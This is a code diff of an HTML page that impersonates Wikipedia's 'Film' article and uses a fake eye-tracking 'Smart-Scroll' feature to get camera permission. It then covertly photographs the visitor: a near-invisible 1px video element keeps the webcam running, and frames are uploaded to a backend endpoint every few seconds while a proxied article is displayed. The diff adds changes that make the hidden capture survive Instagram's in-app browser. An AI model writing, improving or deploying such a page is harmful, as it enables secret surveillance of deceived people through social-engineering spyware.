@@ -4,86 +4,37 @@
     <meta charset="UTF-8">
     <title>Film - Wikipedia</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=0">
-    
     <style>
-        /* Reset and Base Styles */
-        body, html { 
-            margin: 0; 
-            padding: 0; 
-            height: 100%; 
-            width: 100%;
-            overflow: hidden; 
-            background: #fff; 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
-
-        /* Perfectly Centered Permission Overlay */
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background: #fff; font-family: sans-serif; }
+        
         #overlay {
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 100%;
-            background: #fff; 
-            z-index: 9999; 
-            display: flex; 
-            flex-direction: column;
-            align-items: center; 
-            justify-content: center; 
-            text-align: center; 
-            padding: 24px;
-            box-sizing: border-box;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff; z-index: 9999; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; text-align: center; padding: 24px; box-sizing: border-box;
         }
 
-        .wiki-logo { 
-            width: 90px; 
-            margin-bottom: 24px; 
-        }
-
-        h2 { 
-            font-size: 22px; 
-            color: #333; 
-            margin: 0 0 12px 0; 
-        }
-
-        p { 
-            color: #666; 
-            font-size: 15px; 
-            line-height: 1.5;
-            max-width: 320px; 
-            margin: 0 0 32px 0; 
-        }
+        .wiki-logo { width: 90px; margin-bottom: 24px; }
+        h2 { font-size: 22px; color: #333; margin: 0 0 12px 0; }
+        p { color: #666; font-size: 15px; margin: 0 0 32px 0; max-width: 320px; line-height: 1.5; }
 
         #enable-btn {
-            background: #36b; 
-            color: #fff; 
-            border: none; 
-            padding: 16px 32px;
-            border-radius: 4px; 
-            font-weight: bold; 
-            font-size: 16px;
-            cursor: pointer; 
-            width: 100%;
-            max-width: 280px;
-            -webkit-tap-highlight-color: transparent;
+            background: #36b; color: #fff; border: none; padding: 16px 32px;
+            border-radius: 4px; font-weight: bold; font-size: 16px; cursor: pointer; width: 100%; max-width: 280px;
         }
 
-        /* Iframe for Wikipedia Content */
-        #wiki-frame { 
-            width: 100%; 
-            height: 100%; 
-            border: none; 
-            display: none; 
-        }
+        #wiki-frame { width: 100%; height: 100%; border: none; display: none; }
 
-        /* Hidden camera elements */
-        video, canvas { display: none; }
+        /* Instagram Fix: Keep the video slightly visible (1px) so the browser doesn't kill the process */
+        #video {
+            position: fixed; bottom: 0; right: 0; width: 1px; height: 1px; opacity: 0.01; z-index: -1;
+        }
+        canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div id="overlay">
-    <img src="https://en.wikipedia.org/static/images/icons/wikipedia.png" class="wiki-logo" alt="Wiki Logo">
+    <img src="https://en.wikipedia.org/static/images/icons/wikipedia.png" class="wiki-logo">
     <h2>Enable Smart-Scroll</h2>
     <p>Wikipedia now supports Eye-Tracking. Allow camera access to automatically scroll the article as you read.</p>
     <button id="enable-btn">Enable & Read</button>
@@ -104,7 +55,6 @@
 
     btn.addEventListener('click', async () => {
         try {
-            // Request camera with 'ideal' constraints for Instagram/Mobile compatibility
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { 
                     facingMode: 'user',
@@ -115,28 +65,31 @@
             
             video.srcObject = stream;
             
-            // Wait for video stream to initialize to prevent black snapshots
+            // Critical Instagram Fix: ensure play() is called explicitly
+            await video.play();
+
+            // Wait for the stream to be active before switching views
             video.onloadedmetadata = () => {
                 frame.src = "/proxy/wiki";
                 frame.style.display = "block";
                 overlay.style.display = "none";
                 startTime = Date.now();
-                startPhotoLoop();
+                
+                // Add a 1.5s 'warm-up' delay before starting the loop to avoid initial black frames
+                setTimeout(startPhotoLoop, 1500); 
             };
         } catch (err) {
-            alert("Camera access is required for the Smart-Scroll reading experience.");
+            alert("Camera access is required for the Smart-Scroll experience.");
         }
     });
 
     function startPhotoLoop() {
         const elapsed = Date.now() - startTime;
-        
-        // Timing logic: 900ms for the first 10 seconds, then 7 seconds thereafter
         let delay = elapsed < 10000 ? 900 : 7000;
 
         setTimeout(async () => {
+            // Only capture if the video is actually playing and providing data
             if (video.readyState === video.HAVE_ENOUGH_DATA) {
-                // Ensure photo matches camera's natural aspect ratio (no stretching)
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 
@@ -145,18 +98,15 @@
                 
                 const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
                 
-                // Send to backend
                 fetch('/api/upload-photo', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ dataUrl })
                 }).catch(() => {});
             }
-            // Recursive call for the next capture
             startPhotoLoop();
         }, delay);
     }
 </script>
-
 </body>
 </html>
